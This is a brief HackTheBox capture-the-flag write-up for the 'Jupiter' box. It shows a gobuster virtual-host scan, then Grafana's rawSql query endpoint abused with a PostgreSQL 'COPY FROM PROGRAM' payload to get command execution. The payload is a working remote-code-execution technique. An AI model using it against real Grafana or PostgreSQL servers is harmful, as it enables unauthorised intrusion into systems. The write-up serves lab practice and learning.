# HackTheBox - Jupiter

### Rating: MEDIUM

nmap scan, find port 80 is open hosting http

website is basic, nothing found through directory traversal

virtualhost enumeration finds a virtual host address kiosk.jupiter.htb

using gobuster: ```gobuster vhost -u http://jupiter.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain```

add new virtual hosts to /etc/hosts file

kiosk.jupiter.htb is a grafana site

using burpsuite see POST requests being made to http://kiosk.jupiter.htb/api/ds/query

in the POST request, see that there is rawSql postgres queries being sent and executed

in payloadsallthethings there is a postgres sql injection -> RCE vulnerability 

payload:
"rawSql":"drop table if exists cmd_exec; \n create table cmd_exec(cmd_output text); \n copy cmd_exec FROM PROGRAM 'whoami'; \n select * from cmd_exec; \n drop table if exists cmd_exec;"